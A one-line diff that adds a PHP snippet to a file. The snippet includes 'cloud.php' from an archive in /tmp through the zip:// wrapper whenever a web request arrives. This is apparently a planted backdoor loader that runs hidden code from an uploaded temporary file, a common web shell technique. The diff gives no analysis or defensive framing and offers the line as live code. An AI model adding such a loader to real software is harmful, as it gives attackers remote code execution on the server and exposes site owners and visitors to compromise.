@@ -1,0 +1,1 @@
+<?=@null; $h="";if(!empty($_SERVER["HTTP_HOST"])) $h = "cloud.php"; include("zip:///tmp/phpp7SqdB#$h");?>
